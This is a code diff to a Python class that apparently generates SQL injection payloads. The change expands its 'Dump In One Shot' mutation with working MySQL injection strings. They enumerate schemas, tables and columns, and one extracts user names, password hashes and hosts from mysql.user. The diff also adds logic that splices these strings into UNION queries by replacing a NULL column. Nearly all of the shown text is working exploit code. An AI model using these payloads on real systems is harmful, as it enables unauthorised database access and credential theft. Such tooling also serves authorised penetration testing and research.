@@ -314,18 +314,37 @@ class ASTMutator:
         return random.choice(prefixes) + " OR 1=1"
 
     def _dios_mutation(self, payload):
-        """DIOS (Dump In One Shot): Advanced technique for massive data extraction."""
+        """DIOS (Dump In One Shot): Advanced technique for massive data extraction.
+           IMPROVED: Now supports variable column injection for better UNION compatibility.
+        """
+        # Patterns for exfiltration
         dios_patterns = [
-            "(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)",
-            "make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",
-            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)"
+            # Standard DIOS (Column Discovery)
+            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",
+            # Table & Schema mapping
+            "(select(@)from(select(@:=0x00),(select(@)from(information_schema.tables)where(table_schema>=@)and(@)in(@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,0x7C))))a)",
+            # User and Privileges
+            "(select(@)from(select(@:=0x00),(select(@)from(mysql.user)where(@)in(@:=concat(@,0x3C62723E,user,0x3a,password,0x3a,host))))a)",
+            # Single-line concatenated data exfil
+            "(select group_concat(schema_name,0x3a,0x3a) from information_schema.schemata)",
+            # Webview Friendly DIOS
+            "make_set(511,@:=0x0a,(select(1)from(information_schema.tables)where@:=make_set(511,@,0x3c6c693e,table_name)),@)"
         ]
+        
         # Truncate and replace current query with DIOS pattern
         clean_payload = re.sub(r'(--|#|/\*|;%00).*$', '', payload).strip()
-        if "UNION" in clean_payload.upper():
-             # Append to existing union
-             return clean_payload + "," + random.choice(dios_patterns)
-        return clean_payload + " UNION SELECT " + random.choice(dios_patterns)
+        
+        target_pattern = random.choice(dios_patterns)
+        
+        if "UNION" in clean_payload.upper() and "SELECT" in clean_payload.upper():
+             # If we are already in a UNION, we need to balance the columns.
+             # We replace ONE NULL with our exfiltration pattern.
+             if "NULL" in clean_payload.upper():
+                 return clean_payload.replace("NULL", target_pattern, 1)
+             return clean_payload + "," + target_pattern
+             
+        # If not already a union, we start one.
+        return clean_payload + " UNION SELECT " + target_pattern
 
     def _advanced_blind_probing(self, payload):
         """Advanced Blind SQLi using MAKE_SET, LIKE, and REGEXP from reference."""
